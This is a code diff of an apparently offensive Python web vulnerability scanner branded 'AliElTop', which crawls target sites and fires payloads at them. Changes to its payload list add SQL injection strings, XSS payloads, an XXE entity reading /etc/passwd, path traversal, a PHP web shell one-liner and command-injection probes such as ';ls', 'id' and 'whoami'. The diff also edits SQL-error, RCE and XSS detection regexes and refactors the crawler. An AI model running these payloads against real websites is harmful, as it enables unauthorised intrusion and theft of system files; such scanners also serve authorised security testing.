@@ -1,6 +1,5 @@
 import logging
 import tqdm
-import warnings
 import random
 import re
 import urllib3
@@ -16,6 +15,9 @@ import ssl
 import traceback
 import defusedxml.ElementTree as ET
 import functools
+import argparse
+from typing import Set
+from typing import List, Dict, Any, Optional
 from queue import Queue
 from colorama import Fore, Style, init
 from bs4 import BeautifulSoup
@@ -23,6 +25,9 @@ from urllib.parse import urlparse, parse_qs, urljoin, quote
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from itertools import islice
 from urllib.robotparser import RobotFileParser
+from urllib3.util.retry import Retry
+from requests.exceptions import RequestException
+from requests.adapters import HTTPAdapter
 from bs4 import MarkupResemblesLocatorWarning
 
 
@@ -31,23 +36,24 @@ payloads = [
     "'; SELECT * FROM users; --",
     "<script>alert('AliElTop')</script>",
     "<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>",
-    "webshell.php",
+    "%3Cscript%3Ealert%28%27AliElTop%27%29%3C/script%3E",
     "admin' OR '1'='1",
     "../../../../etc/passwd%00",
-    "<img src=x onerror=alert('AliElTop')>",
     "<?php system($_GET['cmd']); ?>",
     "../../../../etc/passwd",
+    "%22==alert(document.domain)||%22",
     "%27%22%3E%3Ch1%3Etest%3C%2Fh1%3E{{7777*7777}}JyI%2bPGgxPnRlc3Q8L2gxPgo",
-    "evil_script.js",
     ";ls",
     "ls",
-    "admin.php",
+    "id",
+    "whoami",
+    "uname -a",
+    "&lt;script&gt;alert('AliElTop')&lt;/script&gt;",
     "+9739343777;phone-context=<script>alert(AliElTop)</script>",
     "+91 97xxxx7x7;ext=1;ext=2",
     "+91 97xxxx7x7;phone-context=' OR 1=1; -",
     "+91 97xxxx7x7;phone-context={{4*4}}{{5+5}}",
-    "robots.txt",
-    "adminer.php",
+    "<style><style /><img src=x onerror=alert(AliElTop)>",
     "phpmyadmin",
     "dbadmin",
     ".env",
@@ -188,7 +194,7 @@ USER_AGENTS = [
 ]
 ALLOWED_HOSTS = ["www.google.com"]
 
-logging.basicConfig(level=logging.WARNING, format="%(levelname)s - %(message)s")
+logging.basicConfig(level=logging.CRITICAL, format="%(levelname)s - %(message)s")
 
 def print_logo():
     logo = """
@@ -300,7 +306,6 @@ def check_sqli(url):
     r"mysql_error",
     r"com\.microsoft\.sqlserver\.jdbc",
     r"General SQL Server error:",
-    r"java\.sql\.BatchUpdateException",
     r"PLS-[0-9]{4}",
     r"SQL syntax.*MySQL",
     r"SQL Server.*Error",
@@ -360,14 +365,12 @@ def check_sqli(url):
     r"SQLSTATE\[42S22\]: Column not found",
     r"ORA-00932",
     r"SQLSTATE\[23000\]: Integrity constraint violation",
-    r"Syntax error in string in query expression",
     r"java\.sql\.SQLException: Column name mismatch",
     r"SQLSTATE\[HY000\]: General error: 1025",
     r"ERROR: duplicate key value violates unique constraint",
     r"ERROR: division by zero",
     r"java\.lang\.ArrayIndexOutOfBoundsException",
     r"SQLSTATE\[08004\]: Server rejected the connection",
-    r"ERROR: column .* does not exist",
     r"javax\.persistence\.TransactionRequiredException",
     r"ERROR: invalid input syntax for type numeric",
     r"Syntax error in UPDATE statement",
@@ -384,7 +387,6 @@ def check_sqli(url):
     r"ERROR: duplicate key violates unique constraint",
     r"java\.sql\.SQLException: Invalid object name",
     r"ERROR: invalid byte sequence for encoding",
-    r"ERROR: relation \".*\" does not exist",
     r"SQLSTATE\[42S12\]: Column not found",
     r"ORA-02291",
     r"Error: ER_ACCESS_DENIED_ERROR",
@@ -392,7 +394,6 @@ def check_sqli(url):
     r"java\.sql\.SQLException: ORA-02292",
     r"SQLSTATE\[23505\]: Unique constraint",
     r"ERROR: missing FROM-clause entry for table",
-    r"ERROR: relation \".*\" does not exist",
     r"java\.sql\.SQLRecoverableException",
     r"java\.sql\.SQLException: Integrity constraint violation",
     r"SQLSTATE\[22018\]: Invalid character value",
@@ -401,7 +402,6 @@ def check_sqli(url):
     r"ORA-00001",
     r"ERROR: null value in column",
     r"ORA-01438",
-    r"SQLSTATE\[42000\]: Syntax error or access violation",
     r"ERROR: duplicate key value violates unique",
     r"ERROR: unterminated quoted string",
     r"java\.sql\.SQLTimeoutException",
@@ -413,7 +413,6 @@ def check_sqli(url):
     r"ERROR: syntax error at end of input",
     r"java\.sql\.SQLException: ResultSet not open",
     r"SQLSTATE\[08001\]: [0-9]{1,10} SQLDriverConnect",
-    r"ERROR: duplicate key violates unique constraint",
     r"java\.sql\.SQLException: ORA-01461",
     r"SQLSTATE\[HY000\]: General error: 1364",
     r"ERROR: column reference \".*\" is ambiguous",
@@ -427,7 +426,6 @@ def check_sqli(url):
     r"java\.sql\.SQLException: ResultSet is closed",
     r"ORA-00904",
     r"ERROR: failed to find conversion function from unknown to text",
-    r"ERROR: division by zero",
     r"ERROR: cannot insert multiple commands into a prepared statement",
     r"ERROR: relation \".*\" does not exist at character",
     r"java\.sql\.SQLException: ORA-02291",
@@ -436,18 +434,15 @@ def check_sqli(url):
     r"ERROR: syntax error at or near \".*\"",
     r"java\.lang\.NoSuchMethodError",
     r"SQLSTATE\[08006\]: No connection to the server",
-    r"java\.sql\.SQLException: ORA-02292",
     r"SQLSTATE\[23502\]: Not null violation",
     r"ERROR: syntax error at or near \"[^\"]+\"",
     r"java\.sql\.SQLException: No value specified",
     r"ERROR: relation \".*\" already exists at character",
     r"ORA-02292",
     r"SQLSTATE\[23000\]: Integrity constraint violation: 1452",
-    r"ERROR: relation \".*\" already exists",
     r"SQLSTATE\[HY093\]: Invalid parameter number: no parameters",
     r"java\.sql\.SQLNonTransientConnectionException",
     r"SQLSTATE\[HY000\]: General error: 1418",
-    r"ERROR: duplicate key value violates unique constraint",
     r"ERROR: column \".*\" specified more than once",
     r"java\.sql\.SQLTransientConnectionException",
     r"ERROR: value too long for type character varying",
@@ -457,11 +452,9 @@ def check_sqli(url):
     r"ERROR: syntax error at or near \".*\" at character",
     r"java\.lang\.NoSuchMethodException",
     r"SQLSTATE\[22005\]: Data exception: string data",
-    r"ERROR: duplicate key violates unique constraint",
     r"ERROR: column \".*\" specified more than once at character",
     r"SQLSTATE\[42000\]: Syntax error or access violation: 1067",
     r"java\.sql\.SQLFeatureNotSupportedException",
-    r"ERROR: duplicate key violates unique constraint",
     r"SQLSTATE\[HY093\]: Invalid parameter number",
     r"ERROR: current transaction is aborted,",
     r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
@@ -469,359 +462,47 @@ def check_sqli(url):
     r"ERROR: current transaction is aborted, commands",
     r"SQLSTATE\[HY000\]: General error: 1360",
     r"ERROR: column \".*\" of relation \".*\" does not exist",
-    r"ERROR: duplicate key value violates unique constraint",
     r"ERROR: invalid byte sequence for encoding \"UTF8\"",
     r"SQLSTATE\[08006\]: No connection to the server:",
     r"ERROR: column \".*\" of relation \".*\" does not exist at character",
-    r"java\.sql\.SQLException: No data found",
     r"ERROR: could not open file",
     r"SQLSTATE\[22007\]: Invalid datetime format: 1292",
     r"ERROR: unterminated quoted string at or near",
     r"java\.sql\.SQLIntegrityConstraintViolationException: Duplicate entry",
     r"SQLSTATE\[HY000\]: General error: 1021",
-    r"ERROR: duplicate key violates unique constraint",
     r"java\.sql\.SQLException: No results were returned",
     r"ERROR: unterminated quoted string at or near \".*\"",
     r"java\.sql\.SQLException: ORA-00904",
     r"SQLSTATE\[42000\]: Syntax error or access violation: 1093",
     r"ERROR: relation \".*\" does not exist LINE",
-    r"ERROR: unterminated quoted string at or near",
-    r"java\.sql\.SQLException: ORA-02291",
     r"SQLSTATE\[HY000\]: General error: 1055",
     r"ERROR: unterminated quoted string at or near \".*\" at character",
     r"java\.lang\.NoSuchFieldError",
     r"SQLSTATE\[08003\]: No connection to the server",
     r"ERROR: relation \".*\" does not exist LINE.*SQL",
-    r"ERROR: unterminated quoted string at or near",
-    r"java\.sql\.SQLException: Invalid object name",
     r"ERROR: relation \".*\" already exists LINE.*SQL",
-    r"SQLSTATE\[HY000\]: General error: 1366",
     r"ERROR: unterminated quoted string at or near \".*\" LINE",
     r"java\.lang\.ClassNotFoundException",
-    r"SQLSTATE\[08006\]: No connection to the server:",
     r"ERROR: relation \".*\" does not exist at character.*LINE",
     r"ERROR: unterminated quoted string at or near \".*\" at character.*LINE",
     r"java\.lang\.NoSuchMethodException: .*set[a-zA-Z]+",
     r"SQLSTATE\[HY000\]: General error: 2013",
-    r"ERROR: unterminated quoted string at or near",
     r"java\.lang\.ClassCastException: ",
     r"SQLSTATE\[42000\]: Syntax error or access violation: 1109",
     r"ERROR: relation \".*\" already exists LINE",
-    r"SQLSTATE\[HY000\]: General error: 1418",
-    r"ERROR: unterminated quoted string at or near \".*\" at character.*LINE",
     r"java\.lang\.IllegalAccessException",
-    r"SQLSTATE\[08006\]: No connection to the server",
-    r"ERROR: unterminated quoted string at or near \".*\" at character.*LINE",
     r"java\.sql\.SQLException: Invalid object name.*LINE",
     r"ERROR: column \".*\" specified more than once at character.*LINE",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
     r"java\.lang\.ClassCastException:.*LINE",
     r"ERROR: current transaction is aborted, commands ignored until end of transaction block.*LINE",
-    r"SQLSTATE\[HY000\]: General error: 1360",
     r"ERROR: column \".*\" of relation \".*\" does not exist at character.*LINE",
-    r"ERROR: duplicate key value violates unique constraint",
     r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
-    r"SQLSTATE\[08006\]: No connection to the server:",
     r"ERROR: column \".*\" of relation \".*\" does not exist LINE.*SQL",
-    r"java\.sql\.SQLException: No data found",
     r"ERROR: could not open file.*LINE",
-    r"SQLSTATE\[22007\]: Invalid datetime format: 1292",
     r"ERROR: unterminated quoted string at or near.*LINE",
-    r"SQLSTATE\[HY000\]: General error: 1021",
     r"ERROR: duplicate key violates unique constraint.*LINE",
-    r"java\.sql\.SQLException: No results were returned",
-    r"ERROR: unterminated quoted string at or near.*LINE",
     r"java\.sql\.SQLException: ORA-00904.*LINE",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1093",
-    r"ERROR: relation \".*\" does not exist LINE",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: Invalid object name",
-    r"ERROR: relation \".*\" already exists LINE",
-    r"SQLSTATE\[HY000\]: General error: 1366",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.ClassNotFoundException",
-    r"SQLSTATE\[08006\]: No connection to the server:",
-    r"ERROR: relation \".*\" does not exist at character.*LINE",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.NoSuchMethodException: .*set[a-zA-Z]+",
-    r"SQLSTATE\[HY000\]: General error: 2013",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.ClassCastException: ",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1109",
-    r"ERROR: relation \".*\" already exists LINE",
-    r"SQLSTATE\[HY000\]: General error: 1418",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.IllegalAccessException",
-    r"SQLSTATE\[08006\]: No connection to the server",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: Invalid object name.*LINE",
-    r"ERROR: column \".*\" specified more than once at character.*LINE",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
-    r"java\.lang\.ClassCastException:.*LINE",
-    r"ERROR: current transaction is aborted, commands ignored until end of transaction block.*LINE",
-    r"SQLSTATE\[HY000\]: General error: 1360",
-    r"ERROR: column \".*\" of relation \".*\" does not exist at character.*LINE",
     r"ERROR: duplicate key value violates unique constraint.*LINE",
-    r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
-    r"SQLSTATE\[08006\]: No connection to the server:",
-    r"ERROR: column \".*\" of relation \".*\" does not exist LINE.*SQL",
-    r"java\.sql\.SQLException: No data found",
-    r"ERROR: could not open file.*LINE",
-    r"SQLSTATE\[22007\]: Invalid datetime format: 1292",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"SQLSTATE\[HY000\]: General error: 1021",
-    r"ERROR: duplicate key violates unique constraint.*LINE",
-    r"java\.sql\.SQLException: No results were returned",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: ORA-00904.*LINE",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1093",
-    r"ERROR: relation \".*\" does not exist LINE",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: Invalid object name",
-    r"ERROR: relation \".*\" already exists LINE",
-    r"SQLSTATE\[HY000\]: General error: 1366",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.ClassNotFoundException",
-    r"SQLSTATE\[08006\]: No connection to the server:",
-    r"ERROR: relation \".*\" does not exist at character.*LINE",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.NoSuchMethodException: .*set[a-zA-Z]+",
-    r"SQLSTATE\[HY000\]: General error: 2013",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.ClassCastException: ",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1109",
-    r"ERROR: relation \".*\" already exists LINE",
-    r"SQLSTATE\[HY000\]: General error: 1418",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.IllegalAccessException",
-    r"SQLSTATE\[08006\]: No connection to the server",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: Invalid object name.*LINE",
-    r"ERROR: column \".*\" specified more than once at character.*LINE",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
-    r"java\.lang\.ClassCastException:.*LINE",
-    r"ERROR: current transaction is aborted, commands ignored until end of transaction block.*LINE",
-    r"SQLSTATE\[HY000\]: General error: 1360",
-    r"ERROR: column \".*\" of relation \".*\" does not exist at character.*LINE",
-    r"ERROR: duplicate key value violates unique constraint.*LINE",
-    r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
-    r"SQLSTATE\[08006\]: No connection to the server:",
-    r"ERROR: column \".*\" of relation \".*\" does not exist LINE.*SQL",
-    r"java\.sql\.SQLException: No data found",
-    r"ERROR: could not open file.*LINE",
-    r"SQLSTATE\[22007\]: Invalid datetime format: 1292",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"SQLSTATE\[HY000\]: General error: 1021",
-    r"ERROR: duplicate key violates unique constraint.*LINE",
-    r"java\.sql\.SQLException: No results were returned",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: ORA-00904.*LINE",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1093",
-    r"ERROR: relation \".*\" does not exist LINE",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: Invalid object name",
-    r"ERROR: relation \".*\" already exists LINE",
-    r"SQLSTATE\[HY000\]: General error: 1366",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.ClassNotFoundException",
-    r"SQLSTATE\[08006\]: No connection to the server:",
-    r"ERROR: relation \".*\" does not exist at character.*LINE",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.NoSuchMethodException: .*set[a-zA-Z]+",
-    r"SQLSTATE\[HY000\]: General error: 2013",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.ClassCastException: ",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1109",
-    r"ERROR: relation \".*\" already exists LINE",
-    r"SQLSTATE\[HY000\]: General error: 1418",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.IllegalAccessException",
-    r"SQLSTATE\[08006\]: No connection to the server",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: Invalid object name.*LINE",
-    r"ERROR: column \".*\" specified more than once at character.*LINE",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
-    r"java\.lang\.ClassCastException:.*LINE",
-    r"ERROR: current transaction is aborted, commands ignored until end of transaction block.*LINE",
-    r"SQLSTATE\[HY000\]: General error: 1360",
-    r"ERROR: column \".*\" of relation \".*\" does not exist at character.*LINE",
-    r"ERROR: duplicate key value violates unique constraint.*LINE",
-    r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
-    r"SQLSTATE\[08006\]: No connection to the server:",
-    r"ERROR: column \".*\" of relation \".*\" does not exist LINE.*SQL",
-    r"java\.sql\.SQLException: No data found",
-    r"ERROR: could not open file.*LINE",
-    r"SQLSTATE\[22007\]: Invalid datetime format: 1292",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"SQLSTATE\[HY000\]: General error: 1021",
-    r"ERROR: duplicate key violates unique constraint.*LINE",
-    r"java\.sql\.SQLException: No results were returned",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: ORA-00904.*LINE",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1093",
-    r"ERROR: relation \".*\" does not exist LINE",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: Invalid object name",
-    r"ERROR: relation \".*\" already exists LINE",
-    r"SQLSTATE\[HY000\]: General error: 1366",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.ClassNotFoundException",
-    r"SQLSTATE\[08006\]: No connection to the server:",
-    r"ERROR: relation \".*\" does not exist at character.*LINE",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.NoSuchMethodException: .*set[a-zA-Z]+",
-    r"SQLSTATE\[HY000\]: General error: 2013",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.ClassCastException: ",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1109",
-    r"ERROR: relation \".*\" already exists LINE",
-    r"SQLSTATE\[HY000\]: General error: 1418",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.IllegalAccessException",
-    r"SQLSTATE\[08006\]: No connection to the server",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: Invalid object name.*LINE",
-    r"ERROR: column \".*\" specified more than once at character.*LINE",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
-    r"java\.lang\.ClassCastException:.*LINE",
-    r"ERROR: current transaction is aborted, commands ignored until end of transaction block.*LINE",
-    r"SQLSTATE\[HY000\]: General error: 1360",
-    r"ERROR: column \".*\" of relation \".*\" does not exist at character.*LINE",
-    r"ERROR: duplicate key value violates unique constraint.*LINE",
-    r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
-    r"SQLSTATE\[08006\]: No connection to the server:",
-    r"ERROR: column \".*\" of relation \".*\" does not exist LINE.*SQL",
-    r"java\.sql\.SQLException: No data found",
-    r"ERROR: could not open file.*LINE",
-    r"SQLSTATE\[22007\]: Invalid datetime format: 1292",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"SQLSTATE\[HY000\]: General error: 1021",
-    r"ERROR: duplicate key violates unique constraint.*LINE",
-    r"java\.sql\.SQLException: No results were returned",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: ORA-00904.*LINE",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1093",
-    r"ERROR: relation \".*\" does not exist LINE",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: Invalid object name",
-    r"ERROR: relation \".*\" already exists LINE",
-    r"SQLSTATE\[HY000\]: General error: 1366",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.ClassNotFoundException",
-    r"SQLSTATE\[08006\]: No connection to the server:",
-    r"ERROR: relation \".*\" does not exist at character.*LINE",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.NoSuchMethodException: .*set[a-zA-Z]+",
-    r"SQLSTATE\[HY000\]: General error: 2013",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.ClassCastException: ",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1109",
-    r"ERROR: relation \".*\" already exists LINE",
-    r"SQLSTATE\[HY000\]: General error: 1418",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.IllegalAccessException",
-    r"SQLSTATE\[08006\]: No connection to the server",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: Invalid object name.*LINE",
-    r"ERROR: column \".*\" specified more than once at character.*LINE",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
-    r"java\.lang\.ClassCastException:.*LINE",
-    r"ERROR: current transaction is aborted, commands ignored until end of transaction block.*LINE",
-    r"SQLSTATE\[HY000\]: General error: 1360",
-    r"ERROR: column \".*\" of relation \".*\" does not exist at character.*LINE",
-    r"ERROR: duplicate key value violates unique constraint.*LINE",
-    r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
-    r"SQLSTATE\[08006\]: No connection to the server:",
-    r"ERROR: column \".*\" of relation \".*\" does not exist LINE.*SQL",
-    r"java\.sql\.SQLException: No data found",
-    r"ERROR: could not open file.*LINE",
-    r"SQLSTATE\[22007\]: Invalid datetime format: 1292",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"SQLSTATE\[HY000\]: General error: 1021",
-    r"ERROR: duplicate key violates unique constraint.*LINE",
-    r"java\.sql\.SQLException: No results were returned",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: ORA-00904.*LINE",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1093",
-    r"ERROR: relation \".*\" does not exist LINE",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: Invalid object name",
-    r"ERROR: relation \".*\" already exists LINE",
-    r"SQLSTATE\[HY000\]: General error: 1366",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.ClassNotFoundException",
-    r"SQLSTATE\[08006\]: No connection to the server:",
-    r"ERROR: relation \".*\" does not exist at character.*LINE",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.NoSuchMethodException: .*set[a-zA-Z]+",
-    r"SQLSTATE\[HY000\]: General error: 2013",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.ClassCastException: ",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1109",
-    r"ERROR: relation \".*\" already exists LINE",
-    r"SQLSTATE\[HY000\]: General error: 1418",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.IllegalAccessException",
-    r"SQLSTATE\[08006\]: No connection to the server",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: Invalid object name.*LINE",
-    r"ERROR: column \".*\" specified more than once at character.*LINE",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
-    r"java\.lang\.ClassCastException:.*LINE",
-    r"ERROR: current transaction is aborted, commands ignored until end of transaction block.*LINE",
-    r"SQLSTATE\[HY000\]: General error: 1360",
-    r"ERROR: column \".*\" of relation \".*\" does not exist at character.*LINE",
-    r"ERROR: duplicate key value violates unique constraint.*LINE",
-    r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
-    r"SQLSTATE\[08006\]: No connection to the server:",
-    r"ERROR: column \".*\" of relation \".*\" does not exist LINE.*SQL",
-    r"java\.sql\.SQLException: No data found",
-    r"ERROR: could not open file.*LINE",
-    r"SQLSTATE\[22007\]: Invalid datetime format: 1292",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"SQLSTATE\[HY000\]: General error: 1021",
-    r"ERROR: duplicate key violates unique constraint.*LINE",
-    r"java\.sql\.SQLException: No results were returned",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: ORA-00904.*LINE",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1093",
-    r"ERROR: relation \".*\" does not exist LINE",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: Invalid object name",
-    r"ERROR: relation \".*\" already exists LINE",
-    r"SQLSTATE\[HY000\]: General error: 1366",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.ClassNotFoundException",
-    r"SQLSTATE\[08006\]: No connection to the server:",
-    r"ERROR: relation \".*\" does not exist at character.*LINE",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.NoSuchMethodException: .*set[a-zA-Z]+",
-    r"SQLSTATE\[HY000\]: General error: 2013",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.ClassCastException: ",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1109",
-    r"ERROR: relation \".*\" already exists LINE",
-    r"SQLSTATE\[HY000\]: General error: 1418",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.lang\.IllegalAccessException",
-    r"SQLSTATE\[08006\]: No connection to the server",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"java\.sql\.SQLException: Invalid object name.*LINE",
-    r"ERROR: column \".*\" specified more than once at character.*LINE",
-    r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
-    r"java\.lang\.ClassCastException:.*LINE",
-    r"ERROR: current transaction is aborted, commands ignored until end of transaction block.*LINE",
-    r"SQLSTATE\[HY000\]: General error: 1360",
-    r"ERROR: column \".*\" of relation \".*\" does not exist at character.*LINE",
-    r"ERROR: duplicate key value violates unique constraint.*LINE",
-    r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
-    r"SQLSTATE\[08006\]: No connection to the server:",
-    r"ERROR: column \".*\" of relation \".*\" does not exist LINE.*SQL",
-    r"java\.sql\.SQLException: No data found",
-    r"ERROR: could not open file.*LINE",
-    r"SQLSTATE\[22007\]: Invalid datetime format: 1292",
-    r"ERROR: unterminated quoted string at or near.*LINE",
-    r"SQLSTATE\[HY000\]: General error: 1021",
         ]
 
         for pattern in patterns:
@@ -839,33 +520,8 @@ def check_rce(url):
         response.raise_for_status()
 
         rce_patterns = [
-            r"ERROR: Command execution",
-            r"System\.Exec",
-            r"exec\(",
-            r"passthru\(",
-            r"shell_exec\(",
-            r"popen\(",
-            r"proc_open\(",
-            r"eval\(",
-            r"assert\(",
-            r"java\.lang\.Runtime\.getRuntime\(\)\.exec\(",
-            r"java\.lang\.ProcessBuilder\.start\(",
-            r"os\.system\(",
-            r"subprocess\.Popen\(",
-            r"subprocess\.call\(",
-            r"subprocess\.check_output\(",
-            r"subprocess\.check_call\(",
-            r"Runtime\.getRuntime\(\)\.exec\(",
-            r"exec\(\$_(GET|POST|REQUEST)",
-            r"assert\(\$_(GET|POST|REQUEST)",
-            r"shell_exec\(\$_(GET|POST|REQUEST)",
-            r"passthru\(\$_(GET|POST|REQUEST)",
-            r"popen\(\$_(GET|POST|REQUEST)",
-            r"proc_open\(\$_(GET|POST|REQUEST)",
-            r"eval\(\$_(GET|POST|REQUEST)",
-            r"system\(\$_(GET|POST|REQUEST)",
-            r"System\.Exec\(\$_(GET|POST|REQUEST)",
-            r"os\.system\(\$_(GET|POST|REQUEST)",
+            r"root:",
+            
         ]
 
         for pattern in rce_patterns:
@@ -883,28 +539,6 @@ def check_xss(url):
         response.raise_for_status()
 
         xss_patterns = [
-            r"on\w+\s*=",
-            r"javascript:\s*;",
-            r"eval\(",
-            r"document\.cookie",
-            r"document\.write\(",
-            r"document\.location\(",
-            r"window\.location\(",
-            r"location\.href",
-            r"<img[^>]*\s+src\s*=\s*[\"']([^\"'>]+)[\"'][^>]*>",
-            r"<iframe[^>]*>",
-            r"<object[^>]*>",
-            r"<embed[^>]*>",
-            r"<video[^>]*>",
-            r"<audio[^>]*>",
-            r"<svg[^>]*>",
-            r"&#x.{1,5};",
-            r"%[0-9a-fA-F]{2}",
-            r"&#\d+;",
-            r"expression\(",
-            r"url\(",
-            r"url\s*\(",
-            r"import\s*(",
             r"AliElTop",
         ]
 
@@ -1623,7 +1257,7 @@ def collect_urls(target_url, num_threads=10, session=None):
     processed_urls_lock = threading.Lock()
 
     def extract_urls_from_html(html, base_url):
-        soup = BeautifulSoup(html, 'html.parser')
+        soup = BeautifulSoup(html, 'lxml')
         extracted_urls = set()
         for link in soup.find_all('a', href=True):
             url = link['href']
@@ -1657,6 +1291,10 @@ def collect_urls(target_url, num_threads=10, session=None):
 
                 with urls_lock:
                     urls.update(filtered_urls)
+            elif response.status_code == 404:
+                logging.warning(f"URL returned 404 Not Found: {current_url}")
+            else:
+                logging.warning(f"URL returned status code {response.status_code}: {current_url}")
         except requests.exceptions.RequestException as e:
             logging.error(f"Request Exception for URL: {current_url}, Error: {e}")
         except Exception as e:
@@ -1664,29 +1302,28 @@ def collect_urls(target_url, num_threads=10, session=None):
 
         return set()
 
+    def worker():
+        while True:
+            current_url = task_queue.get()
+            if current_url is None:
+                task_queue.task_done()
+                break
+            if validate_url(current_url):
+                filtered_urls = process_url(current_url)
+                task_queue.task_done()
+            else:
+                task_queue.task_done()
+                logging.warning(f"Invalid URL: {current_url}")
+
     with tqdm.tqdm(total=len(urls), desc="Collecting URLs", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}") as pbar:
         task_queue = Queue()
 
-        @functools.lru_cache(maxsize=None)
         def validate_url(url):
             try:
                 parsed_url = urlparse(url)
                 return all([parsed_url.scheme, parsed_url.netloc])
             except ValueError:
                 return False
-
-        def worker():
-            while True:
-                current_url = task_queue.get()
-                if current_url is None:
-                    task_queue.task_done()
-                    break
-                if validate_url(current_url):
-                    filtered_urls = process_url(current_url)
-                    task_queue.task_done()
-                else:
-                    task_queue.task_done()
